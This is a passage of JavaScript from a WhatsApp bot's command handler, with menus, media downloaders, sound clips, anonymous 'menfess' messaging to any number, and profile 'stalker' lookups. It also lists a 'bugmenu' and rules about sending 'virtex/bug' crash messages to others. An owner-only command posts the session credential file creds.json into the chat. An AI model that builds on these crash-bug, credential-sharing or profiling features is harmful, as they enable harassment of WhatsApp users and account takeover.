            }
            }
            break 
	case 'public': {
if (!DanzTheCreator) return reply(mess.only.owner)
NanoBotz.public = true
replynano('*Successfully Converted To Public Use*')
            }
            break
            case 'self': {
if (!DanzTheCreator) return reply(mess.only.owner)
NanoBotz.public = false
replynano('*Success Turns Into Its Own Use*')
            }
            break

case 'smeme': case 'stickermeme': case 'stickmeme': {
if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return replynano(`Usage: ${prefix + command} text1|text2`)
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await NanoBotz.downloadAndSaveMediaMessage(quoted)
mem = await UploadFileUgu(mee)
meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem.url}`
memek = await NanoBotz.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
} else {
replynano(`Send/Reply to Images With Caption ${prefix + command} text1|text2`)
}
}
break

case 'jadibot': {
     replynano('fitur ini tersedia di next update')
}
break     
case 'listjadibot': 
try {
let user = [... new Set([...global.conns.filter(NanoBotz => NanoBotz.user).map(NanoBotz => NanoBotz.user)])]
te = "*Rentbot List*\n\n"
for (let i of user){
y = await NanoBotz.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
NanoBotz.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
replynano(`Belum ada pengguna yang menyewa bot`)
}
break
case 'clearall': {
if (!DanzTheCreator) return reply(mess.only.owner)
NanoBotz.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
case 'pinchat': {
if (!DanzTheCreator) return reply(mess.only.owner)
if (m.isGroup) return reply(mess.only.private)
NanoBotz.chatModify({ pin: true }, m.chat)
}
break
case 'unpinchat': {
if (!DanzTheCreator) return reply(mess.only.owner)
if (m.isGroup) return reply(mess.only.private)
NanoBotz.chatModify({ pin: false }, m.chat)
}
break
case 'restart':
if (!DanzTheCreator) return reply(mess.only.owner)
replynano(`restarting ${global.botname}`)
replynano(`Done 🚹`)
await sleep(3000)
process.exit()
break


case 'menu': {
  reply(mess.wait)
	       let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let uptime = await runtime(process.uptime())
            let timestampe = speed()
            let latensie = speed() - timestampe
          let nano_sad = `🚹 *Wagwan ${pushname}!* 🚹
Welcome to *${botname}*, Im at your service my liege!

┌─ 🚹 *𝗗𝗔𝗦𝗛𝗕𝗢𝗔𝗥𝗗* ─┐
│
├─ ㊕ *𝗡𝗔𝗠𝗘*: ${pushname} 🚹
├─ ㊕ *𝗠𝗢𝗗𝗘*: _${NanoBotz.public ? 'Public' : 'Self'}_
│
├─ 🚹 *𝗜𝗡𝗙𝗢 𝗕𝗢𝗧* ─┐
│
├─ ㊕ *𝗕𝗼𝘁 𝗡𝗮𝗺𝗲*: ${botname}
├─ ㊕ *𝗥𝘂𝗻𝘁𝗶𝗺𝗲*: ${runtime(process.uptime())}
└─ ㊕ *𝗩𝗲𝗿𝘀𝗶𝗼𝗻*: 1.0
└─ 🚹 𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂 𝗳𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 *${botname}*! 🌟
*ᴄʜᴏᴏᴏꜱᴇ ᴀ ᴍᴇɴᴜ ᴄᴀᴛᴇɢᴏʀʏ ʙᴇʟᴏᴡ* 👇 
🚹 *ᴀʟʟᴍᴇɴᴜ*
🚹 *ɴꜱꜰᴡᴍᴇɴᴜ*
🚹 *ɢᴀᴍᴇᴍᴇɴᴜ*
🚹 *ᴅᴏᴡɴʟᴏᴀᴅᴍᴇɴᴜ*
🚹 *ꜰᴜɴᴍᴇɴᴜ*
🚹 *ᴀɪᴍᴇɴᴜ*
🚹 *ɢʀᴏᴜᴘᴍᴇɴᴜ*
🚹 *ᴏᴡɴᴇʀᴍᴇɴᴜ*
🚹 *ᴇᴘʜᴏᴛᴏ360ᴍᴇɴᴜ*
🚹 *ᴀɴɪᴍᴇᴍᴇɴᴜ*
🚹 *ʀᴀɴᴅᴏᴍᴘʜᴏᴛᴏᴍᴇɴᴜ*
🚹 *ꜱᴛᴀʟᴋᴇʀᴍᴇɴᴜ*
🚹 *ʙᴜɢᴍᴇɴᴜ*
🚹 *ᴏᴛʜᴇʀᴍᴇɴᴜ*
🚹 *ᴀɴᴏɴʏᴍᴏᴜꜱᴍᴇɴᴜ*`
await NanoBotz.sendMessage(m.chat, { image: thumb, caption: nano_sad, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true }},{ quoted: null })
{
await sleep(100)
NanoBotz.sendMessage(m.chat, { react: { text: '🚹', key: m.key }})
}
           }
           break
//=========================================\\
 
//=========================================\\
case 'allmenu': {
  let nano_sad = `${allmenu(prefix, hituet)}`
  await NanoBotz.sendMessage(m.chat, { image: thumb, caption: nano_sad, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true }},{ quoted: null })
  {
  await sleep(100)
  NanoBotz.sendMessage(m.chat, { react: { text: '🚹', key: m.key }})
  }
             }
             break

             case 'gamemenu': {
              let nano_sad = `${gamemenu(prefix, hituet)}`
           await NanoBotz.sendMessage(m.chat, { image: thumb, caption: nano_sad, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true }},{ quoted: null })
           {
           await sleep(100)
           NanoBotz.sendMessage(m.chat, { react: { text: '🚹', key: m.key }})
           }
                      }
                      break
//=========================================\\
case 'anonymousmenu': {
  let nano_sad = `${anonymousmenu(prefix, hituet)}`
await NanoBotz.sendMessage(m.chat, { image: thumb, caption: nano_sad, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true }},{ quoted: null })
{
await sleep(100)
NanoBotz.sendMessage(m.chat, { react: { text: '🚹', key: m.key }})
}
           }
           break
//=========================================\\
case 'ownermenu': {
  let nano_sad = `${ ownermenu(prefix, hituet)}`
await NanoBotz.sendMessage(m.chat, { image: thumb, caption: nano_sad, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true }},{ quoted: null })
{
await sleep(100)
NanoBotz.sendMessage(m.chat, { react: { text: '🚹', key: m.key }})
}
           }
           break

           case 'pushmenu': {
            let nano_sad = `${ pushmenu(prefix, hituet)}`
          await NanoBotz.sendMessage(m.chat, { image: thumb, caption: nano_sad, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true }},{ quoted: null })
          {
          await sleep(100)
          NanoBotz.sendMessage(m.chat, { react: { text: '🚹', key: m.key }})
          }
                     }
                     break

case 'othermenu': {
  let nano_sad = `${othermenu(prefix, hituet)}`
await NanoBotz.sendMessage(m.chat, { image: thumb, caption: nano_sad, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true }},{ quoted: null })
{
await sleep(100)
NanoBotz.sendMessage(m.chat, { react: { text: '🚹', key: m.key }})
}
           }
           break
           case 'downloadmenu': { 
            let nano_sad = `${downloadmenu(prefix, hituet)}`  
            await NanoBotz.sendMessage(m.chat, { image: thumb, caption: nano_sad, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true }},{ quoted: null })
            {
            await sleep(100)
            NanoBotz.sendMessage(m.chat, { react: { text: '🚹', key: m.key }})
            }
                       }
                       break
                       case 'othermenu': {
  let nano_sad = `${othermenu(prefix, hituet)}`
await NanoBotz.sendMessage(m.chat, { image: thumb, caption: nano_sad, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true }},{ quoted: null })
{
await sleep(100)
NanoBotz.sendMessage(m.chat, { react: { text: '🚹', key: m.key }})
}
           }
           break
           case 'downloadmenu': { 
            let nano_sad = `${downloadmenu(prefix, hituet)}`  
            await NanoBotz.sendMessage(m.chat, { image: thumb, caption: nano_sad, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true }},{ quoted: null })
            {
            await sleep(100)
            NanoBotz.sendMessage(m.chat, { react: { text: '🚹', key: m.key }})
            }
                       }
                       break
                       case 'stalkermenu': { 
                        let nano_sad = `${stalkermenu(prefix, hituet)}`  
                        await NanoBotz.sendMessage(m.chat, { image: thumb, caption: nano_sad, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true }},{ quoted: null })
                        {
                        await sleep(100)
                        NanoBotz.sendMessage(m.chat, { react: { text: '🚹', key: m.key }})
                        }
                                   }
                                   break
case 'confess': case 'confes': case 'menfes': case 'menfess': {
    NanoBotz.menfes = NanoBotz.menfes ?? {};
    const session = Object.values(NanoBotz.menfes).find(v => v.state === 'CHATTING' && [v.a, v.b].includes(m.sender));
    if (session) {
        const target = session.a === m.sender ? session.b : session.a;
        await NanoBotz.sendMessage(target, {
            text: `📩 New message from @${m.sender.split('@')[0]}:\n\n${m.text}`,
            mentions: [m.sender],
        });
        reply("Message forwarded.");
        return;
    }
    const roof = Object.values(NanoBotz.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
    if (roof) return reply("You are still in the menfess session");
    if (m.isGroup) return reply("Feature only available in private chat!");
    if (!text) return reply(`Send orders ${prefix + command} name|number|message\n\nSample :\n${prefix + command} ${pushname}|234xxx|Have a must -have\n`)


    let [namaNya, nomorNya, pesanNya] = text.split('|');
    nomorNya = nomorNya.replace(/^0/, '234');
    if (isNaN(nomorNya)) return reply("Invalid number! Make sure to only use numbers.");

    const yoi = `Hi there is a menfess for you\n\nFrom : ${namaNya}\nMessage : ${pesanNya}\n\nPlease type ${prefix}balasmenfess -- To accept menfess/confess\nPlease type ${prefix}tolakmenfess -- To push menfess/confess\n\n_This message was written by a Bot user, the Bot only delivered_`;
    const tod = await getBuffer('https://telegra.ph/file/c8fdfc8426f5f60b48cca.jpg');

    const id = m.sender;
    NanoBotz.menfes[id] = {
        id,
        a: m.sender,
        b: `${nomorNya}@s.whatsapp.net`,
        state: 'WAITING',
    };

    await NanoBotz.sendMessage(`${nomorNya}@s.whatsapp.net`, { image: tod, caption: yoi });
    reply("The message was successfully sent to the destination number. Hopefully you will reply!");
}
break;
case 'balasmenfess': {
    NanoBotz.menfes = NanoBotz.menfes ?? {};
    const roof = Object.values(NanoBotz.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
    if (!roof) return reply("There is no menfess session yet");

    const room = Object.values(NanoBotz.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING');
    if (!room) return reply("There are no menfess sessions waiting");

    const other = [room.a, room.b].find(user => user !== m.sender);
    room.b = m.sender;
    room.state = 'CHATTING';
    NanoBotz.menfes[room.id] = { ...room };

    await NanoBotz.sendMessage(other, {
        text: `_@${m.sender.split("@")[0]} Has accepted you, now you can chat through this bot. \n\n*note:* type..`,
        mentions: [m.sender],
    });
    reply("Now you can chat!");
    m.reply("Please reply to the message directly on this chat. All messages will be continuedbe continued.");
}
break;

case 'totalmenfess': {
    NanoBotz.menfes = NanoBotz.menfes ?? {};
    const roof = Object.values(NanoBotz.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
    if (!roof) return reply("There are no menfess sessions");

    const other = [roof.a, roof.b].find(user => user !== m.sender);
    await NanoBotz.sendMessage(other, {
        text: `_Hey, @${m.sender.split("@")[0]} refuse you._`,
        mentions: [m.sender],
    });
    reply("Menfess was successfully rejected.");
    delete NanoBotz.menfes[roof.id];
}
break;
case 'stopmenfess': {
    NanoBotz.menfes = NanoBotz.menfes ?? {};
    const find = Object.values(NanoBotz.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
    if (!find) return reply("There are no menfess sessions");

    const to = find.a === m.sender ? find.b : find.a;
    await NanoBotz.sendMessage(to, {
        text: "_This menfess session has been stopped._",
        mentions: [m.sender],
    });
    reply("The menfess session was stopped.");
    delete NanoBotz.menfes[find.id];
}
break;

case 'groupmenu': {
  let nano_sad = `${groupmenu(prefix, hituet)}`
await NanoBotz.sendMessage(m.chat, { image: thumb, caption: nano_sad, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true }},{ quoted: null })
{
await sleep(100)
NanoBotz.sendMessage(m.chat, { react: { text: '🚹', key: m.key }})
}
           }
           break

           case 'funmenu': { 
            let nano_sad = `${funmenu(prefix, hituet)}`
          await NanoBotz.sendMessage(m.chat, { image: thumb, caption: nano_sad, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true }},{ quoted: null })
          {
          await sleep(100)
          NanoBotz.sendMessage(m.chat, { react: { text: '🚹', key: m.key }})
          }
                     }
                     break

                     case 'randomphotomenu': {let nano_sad = `${randomphotomenu(prefix, hituet)}`
                     await NanoBotz.sendMessage(m.chat, { image: thumb, caption: nano_sad, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true }},{ quoted: null })
                     {
                     await sleep(100)
                     NanoBotz.sendMessage(m.chat, { react: { text: '🚹', key: m.key }})
                     }
                                }
                                break

                                case 'ephoto360menu': {
                                  let nano_sad = `${ephoto360menu(prefix, hituet)}`
                                await NanoBotz.sendMessage(m.chat, { image: thumb, caption: nano_sad, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true }},{ quoted: null })
                                {
                                await sleep(100)
                                NanoBotz.sendMessage(m.chat, { react: { text: '🚹', key: m.key }})
                                }
                                           }
                                           break
                                           case 'nsfwmenu': {
                                            let nano_sad = `${nsfwmenu(prefix, hituet)}`
                                          await NanoBotz.sendMessage(m.chat, { image: thumb, caption: nano_sad, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true }},{ quoted: null })
                                          {
                                          await sleep(100)
                                          NanoBotz.sendMessage(m.chat, { react: { text: '🚹', key: m.key }})
                                          }
                                                     }
                                                     break
                                                     case 'animemenu': {
                                                      let nano_sad = `${animemenu(prefix, hituet)}`
                                                    await NanoBotz.sendMessage(m.chat, { image: thumb, caption: nano_sad, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true }},{ quoted: null })
                                                    {
                                                    await sleep(100)
                                                    NanoBotz.sendMessage(m.chat, { react: { text: '🚹', key: m.key }})
                                                    }
                                                               }
                                                               break

                                                               case 'aimenu': {
                                                                let nano_sad = `${aimenu(prefix, hituet)}`
                                                             await NanoBotz.sendMessage(m.chat, { image: thumb, caption: nano_sad, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true }},{ quoted: null })
                                                             {
                                                             await sleep(100)
                                                             NanoBotz.sendMessage(m.chat, { react: { text: '🚹', key: m.key }})
                                                             }
                                                                        }
                                                                        break
                                                                        case 'bugmenu': {
                                                                          let nano_sad = `${bugmenu(prefix, hituet)}`
                                                                        await NanoBotz.sendMessage(m.chat, { image: thumb, caption: nano_sad, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true }},{ quoted: null })
                                                                        {
                                                                        await sleep(100)
                                                                        NanoBotz.sendMessage(m.chat, { react: { text: '🚹', key: m.key }})
                                                                        }
                                                                                   }
                                                                                   break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
case 'mangkane1':
case 'mangkane2':
case 'mangkane3':
case 'mangkane4':
case 'mangkane5':
case 'mangkane6':
case 'mangkane7':
case 'mangkane8':
case 'mangkane9':
case 'mangkane10':
case 'mangkane11':
case 'mangkane12':
case 'mangkane13':
case 'mangkane14':
case 'mangkane15':
case 'mangkane16':
case 'mangkane17':
case 'mangkane18':
case 'mangkane19':
case 'mangkane20':
case 'mangkane21':
case 'mangkane22':
case 'mangkane23':
case 'mangkane24':
case 'mangkane25':
case 'mangkane26':
case 'mangkane27':
case 'mangkane28':
case 'mangkane29':
case 'mangkane30':
case 'mangkane31':
case 'mangkane32':
case 'mangkane33':
case 'mangkane34':
case 'mangkane35':
case 'mangkane36':
case 'mangkane37':
case 'mangkane38':
case 'mangkane39':
case 'mangkane40':
case 'mangkane41':
case 'mangkane42':
case 'mangkane43':
case 'mangkane44':
case 'mangkane45':
case 'mangkane46':
case 'mangkane47':
case 'mangkane48':
case 'mangkane49':
case 'mangkane50':
case 'mangkane51':
case 'mangkane52':
case 'mangkane53':
case 'mangkane54':
case 'acumalaka':
case 'reza-kecap':
case 'farhan-kebab':
case 'omaga':
case 'kamu-nanya':
case 'anjay':
case 'siuu':
viot = 'https://files.catbox.moe/vneik8.jpg'
thumb = 'https://files.catbox.moe/vneik8.jpg'
let sound
if (/sound/.test(command)) sound = `https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`
if (/mangkane/.test(command) && command.replace('mangkane', '') < 25) sound = `https://raw.githubusercontent.com/hyuura/Rest-Sound/main/HyuuraKane/${command}.mp3`
if (/mangkane/.test(command) && command.replace('mangkane', '') > 24) sound = `https://raw.githubusercontent.com/aisyah-rest/mangkane/main/Mangkanenya/${command}.mp3`
if (/acumalaka|reza-kecap|farhan-kebab|omaga|omaga|kamu-nanya|anjay|siuu/.test(command)) sound = `https://github.com/FahriAdison/Base-Sound/raw/main/audio/${command}.mp3`
if (text.toLowerCase() === 'thumb') {
await NanoBotz.sendMessage(m.chat, {audio: {url: sound}, mimetype: 'audio/mpeg', ptt: false, 
contextInfo: {
externalAdReply: {
mediaUrl: 'https://instagram.com/justt.patron', 
mediaType: 2, 
title: '  ⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻  ', 
body: '  ━━━━⬤──────────  ', 
description: 'Now Playing...',
mediaType: 2, 
sourceUrl: 'https://instagram.com/justt.patron',
thumbnail: await (await fetch(viot)).buffer(), 
renderLargerThumbnail: true}}}, {quoted: m})
} else await NanoBotz.sendMessage(m.chat, {audio: {url: sound}, mimetype: 'audio/mpeg', ptt: false}, {quoted: m})
break
case 'friend':
case 'searchfriend':{
NanoBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let teman = pickRandom(dansyaverifikasiuser)
setTimeout(() => {
}, 1000)
setTimeout(() => {
replynano('Managed to get one person')
}, 5000)
setTimeout(() => {
NanoBotz.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
case 'rules': {
  const cap = `┏━━━°❀ ❬ *Rules ${botname} MultiDevice* ❭ ❀°━━━┓

1. ✧ *prohibited from doing spam to the bot *, if caught it will be banned.

2. ✧ If the bot doesn't answer 1x, please try again.But if the bot doesn't answer 2x, that means delay, don't use it yet.

3. ✧ * Don't spam bot, if you haven't donated, just be self -aware * :)

4. ✧ If the limit runs out, please play the game to get exp.Examples of games: guessing, game RPG, etc.

5. ✧ *prohibited from sending virtex/bug to bot *, although there is no effect: v

6. ✧ *It is strictly forbidden to call BOT *, if calling will be automatically blocked.

7. ✧ If you don't understand how to use a bot, please ask the other members.Or if you haven't joined the group bot, type #gcbot and enter the group bot.

8. ✧ If there is an error feature/do not understand how to use it, please report/ask the owner.

9. ✧ If the bot delay, do not spam first.

10. ✧ For User *Premium*, *is strictly forbidden to send the original bug to others*.

┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
`
replynano(cap)
}
break

case 'sc':
case 'script':
case 'support':
case 'channel':
case 'repo': {
const text12 = `*Hi @${sender.split("@")[0]} 🚹*

𝐏𝐀𝐓𝐑𝐎𝐍-𝐌𝐃 𝐑𝐄𝐀𝐋𝐄𝐀𝐒𝐄𝐃 𝐎𝐍 𝐆𝐈𝐓𝐇𝐔𝐁

*REPO LINK:* https://github.com/Itzpatron/PATRON-MD

*HOW TO DEPLOY ON PANEL:* https://youtu.be/ygIOzvZS0z0?si=HBG2WzpWO-2cBBkJ

*DOWNLOAD LINK:* Check repo link readme

*CHANNEL LINK:* https://whatsapp.com/channel/0029Val0s0rIt5rsIDPCoD2q

*DEPLOYMENT LINK:* 
https://dashboard.katabump.com/auth/login#ad2175

*USE .UPDATE TO ALWAYS KEEP YOUR BOT UPDATED*

*DON'T FORGET TO STAR AND FORK REPO AND FOLLOW MY CHANNEL*

*NAMASTE 🚹*

*NOTICE* : *GO AND DOWNLOAD NEW ZIP IF YOU HAD OLD ONE*`
NanoBotz.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: 'PATRON',
"thumbnailUrl": 'https://i.imgur.com/5wsWcjp.jpeg',
sourceUrl: wagc,
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
}
break
case 'getsession':
if (!DanzTheCreator) return reply(mess.only.owner)
replynano('Wait a minute, currently taking your session file')
let sesi = await fs.readFileSync('./session/creds.json')
NanoBotz.sendMessage(m.chat, {
document: sesi,
mimetype: 'application/json',
fileName: 'creds.json'
}, {
quoted: m
})
break
case 'request': case 'reportbug': {
  NanoBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
	if (!text) return replynano(`Example : ${
        prefix + command
      } hi dev play command is not working`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*Hai ${pushname}, Your request has been continued to my owner*.\n*Please wait...*`
            for (let i of owner) {
NanoBotz.sendMessage(i + "@s.whatsapp.net", {
text: textt + teks1,
mentions: [m.sender],
}, {
quoted: m,
})
            }
            NanoBotz.sendMessage(m.chat, {
text: textt + teks2 + teks1,
mentions: [m.sender],
            }, {
quoted: m,
            })

        }
        break
case 'q': case 'quoted': {
if (!m.quoted) return replynano('Reply the Message!!')
let xeonquotx= await NanoBotz.serializeM(await m.getQuotedObj())
if (!xeonquotx.quoted) return replynano('The message that you replied was not sent by the bot ')
await xeonquotx.quoted.copyNForward(m.chat, true)
}
break
case 'igstalk2':{
NanoBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
if (!q) return replynano(`Example ${prefix+command} Justt_patron`)
NanoBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
const aj = await igstalk(`${q}`)
NanoBotz.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
`*/ Instagram Stalker \\*

Full name : ${aj.fullname}
Username : ${aj.username}
Post : ${aj.post}
Followers : ${aj.followers}
Following : ${aj.following}
Bio : ${aj.bio}` }, { quoted: m } )
}
break
case 'ffstalk':{
NanoBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
if (!q) return replynano(`Example ${prefix+command} 946716486`)
reply(mess.wait)
const data = await fetchJson(`https://api.yanzbotz.live/api/stalker/free-fire?id=${encodeURIComponent(text)}`)
const data1 = data.result
replynano(`*/ Free Fire Stalker \\*

Id : ${q}
Nickname : ${data1}`)
}
break
case 'npmstalk':{
  reply(mess.wait)
if (!q) return replynano(`Example ${prefix+command} xeonapi`)
reply(mess.wait)
eha = await npmstalk.npmstalk(q)
replynano(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
//=========================================\\
case 'twitterdl':
case 'twitter': {
  function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
if (!text) return reply('Which link, bro..');
try {
  NanoBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
let { SD, HD, desc, thumb, audio } = await fg.twitter(text)
          let te = ` 
┌─⊷ *TWITTER DL*
▢ Description: ${desc}
└───────────`
NanoBotz.sendMessage(m.chat, {video: {url:HD}, caption: te}, {quoted: m})
} catch (e) {
  console.error(e);
  reply('Server error!');
  return e.toString();
}
}
break
//=========================================\\
case 'tiktok':
case 'tt': {
  if (!text) return replynano(`Sample: ${prefix + command} link`);
NanoBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try {
  const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(text)}`);
    const vidnya = data?.video?.noWatermark;
    if (vidnya) {
      const caption = `*[ TIKTOK DOWNLOADER ]*
*Video dari*: _${data.author?.name ?? 'Unknown'} (@${data.author?.unique_id ?? 'Unknown'})_
*Likes*: _${data.stats?.likeCount ?? 'Unknown'}_
*Comments*: _${data.stats?.commentCount ?? 'Unknown'}_
*Shares*: _${data.stats?.shareCount ?? 'Unknown'}_
*Plays*: _${data.stats?.playCount ?? 'Unknown'}_
*Saves*: _${data.stats?.saveCount ?? 'Unknown'}_
*Title*: _${data.title ?? 'Unknown'}_

\`⏤͟͟͞͞ Downloader By ${botname}\``;
      await NanoBotz.sendMessage(
        m.chat, 
        { caption, video: { url: vidnya } }, 
        { quoted: m }
      );
    } else {
      const nyut = await NanoTTDL(text);
      await NanoBotz.sendMessage(
        m.chat, 
        {
          caption: `Judul: ${nyut.title ?? 'Unknown'}\nDescription: ${nyut.description ?? 'Unknown'}`,
          video: { url: nyut.downloadLink || nyut.hdDownloadLink },
        },
        { quoted: m }
      );
    }
  } catch (error) {
    console.error(error);
    reply('Sorry, there was an error when processing your request.');
 }
}
break;
//==============================================
case 'instagram': case 'igdl': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
	  if (!text) return replynano(`You need to give video urls, posts, reel, any Instagram images`)
	  NanoBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try {
        const data = await fetchJson(`https://btch.us.kg/download/igdl?url=${encodeURIComponent(text)}`);
        if (data && data.result && data.result.length > 0) {
          let sudahDikirim = false; 
            for (const item of data.result) {
              if (sudahDikirim) break;
                const hasil = item.url;
                const cap = `This is her🚹`;
                if (hasil.includes('dst-jpg') || hasil.includes('.jpg') || hasil.includes('.jpeg') || hasil.includes('image')) {
                    await NanoBotz.sendMessage(m.chat, { 
                        image: { url: hasil }, 
                        caption: cap 
                    }, { quoted: m });
                    sudahDikirim = true;
                } else {
                    await NanoBotz.sendMessage(m.chat, { 
                        video: { url: hasil }, 
                        caption: cap 
                    }, { quoted: m });
                } 
            }
        } else {
            console.log('Error: No media found in the result');
            await NanoBotz.sendMessage(m.chat, { text: 'Sorry, the media was not found.' }, { quoted: m });
        }
    } catch (error) {
        console.error('Gagal fetch media IG:', error);
        await NanoBotz.sendMessage(m.chat, { text: 'There was a mistake when taking the media.' }, { quoted: m });
    }
}
break
case 'ttaudio':
case 'tiktokaudio':{
if (!text) return replynano( `Example : ${prefix + command} link`)
NanoBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});
const data = await fetchJson(`https://skizoasia.xyz/api/tiktok?apikey=nonogembul&url=${encodeURIComponent(text)}`)
const audionya = data.data.music_info.play
NanoBotz.sendMessage(m.chat, { audio: { url: audionya }, mimetype: 'audio/mp4' }, { quoted: m })
}
break

case 'ghstalk': case 'githubstalk':{
NanoBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
if (!q) return replynano(`Example ${prefix+command} DGXeon`)
NanoBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
aj = await githubstalk.githubstalk(`${q}`)
NanoBotz.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
